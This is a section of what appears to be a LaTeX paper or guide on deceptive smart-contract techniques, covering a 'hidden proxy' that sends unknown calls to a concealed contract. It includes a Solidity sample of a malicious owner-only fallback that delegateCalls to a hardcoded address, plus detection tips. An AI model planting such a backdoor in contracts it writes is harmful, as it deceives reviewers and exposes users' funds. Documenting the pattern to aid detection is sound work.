\section{Hidden Proxy}

\subsection{Technical Details}

Here, the contract advertises functionalities through its sources but actually redirects to another contract.

One common way to achieve this is to performs \lstinline{delegateCall} on any unknown selector, via the fallback.

The exposed functionalities are not meaningful, the logic is located at a seemingly unrelated \& hidden address.

The target address can be hardcoded or passed as an argument, making it stealthier.

\subsection{Evasion Targets}

This technique stacks another layer of evasion on top those mentioned in \ref{sec:hiding-in-plain-sight}:

\begin{description}
\item[tools]{testing visible code does not bring out the malicious part}
\item[reviewers]{the proxy address may not even be in the byte / source code}
\end{description}

\subsection{Samples}

A malicious fallback can be inserted into an expensive codebase:

\begin{lstlisting}[language=Solidity]
fallback () external {
	if (msg.sender == owner()) {
		(bool success, bytes memory data) = address(0x25B072502FB398eb4f428D60D01f18e8Ffa01448).delegateCall(
			msg.data
		);
	}
}
\end{lstlisting}

\subsection{Detection \& Countermeasures}

In addition to the sources \& indicators mentioned in \ref{sec:hiding-in-plain-sight}:

\begin{description}
\item[history]{the hidden proxy address can be found in the trace logs}
\item[upgrades]{replaying transactions before / after upgrades may show significant differences}
\end{description}

